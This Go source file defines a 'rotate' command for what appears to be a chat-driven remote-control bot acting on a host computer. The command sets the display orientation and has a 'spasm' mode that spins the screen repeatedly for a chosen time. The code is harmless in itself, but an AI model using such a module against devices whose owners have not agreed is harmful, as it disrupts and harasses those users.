package commands

import (
	"fmt"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
)

func (*RotateCommand) Exec(ctx *store.CommandContext, args []string) {
	content := strings.Join(args, " ")

	if utils.HasFlag(content, "spasm") {
		timeout, found := utils.FindNumber(content)
		if !found {
			ctx.ReplyMsg("🟥 You need to provde a number.")
			return
		}

		initial, _ := ctx.ReplyMsg("Rotating screen...")

		until := time.Now().Add(time.Duration(timeout) * time.Second)
		for i := 0; time.Now().Before(until); i = (i + 1) % 4 {
			funcs.RotateScreen(uint32(i))
			time.Sleep(500 * time.Millisecond)
		}

		funcs.RotateScreen(0)

		ctx.DeleteMsg(initial.ID)
		ctx.ReplyMsg("🟩 Successfully rotated screen.")
		return
	}

	var err error

	if utils.HasFlag(content, "0") {
		err = funcs.RotateScreen(0)
	} else if utils.HasFlag(content, "90") {
		err = funcs.RotateScreen(1)
	} else if utils.HasFlag(content, "180") {
		err = funcs.RotateScreen(2)
	} else if utils.HasFlag(content, "270") {
		err = funcs.RotateScreen(3)
	} else {
		ctx.ReplyMsg("🟥 Invalid flag.")
		return
	}

	if err == nil {
		ctx.ReplyMsg("🟩 Successfully rotated screen.")
	} else {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to rotate screen - %s", err))
	}
}

func (*RotateCommand) Name() string {
	return "rotate"
}

func (*RotateCommand) Info() string {
	return "Rotates the device display."
}

type RotateCommand struct{}
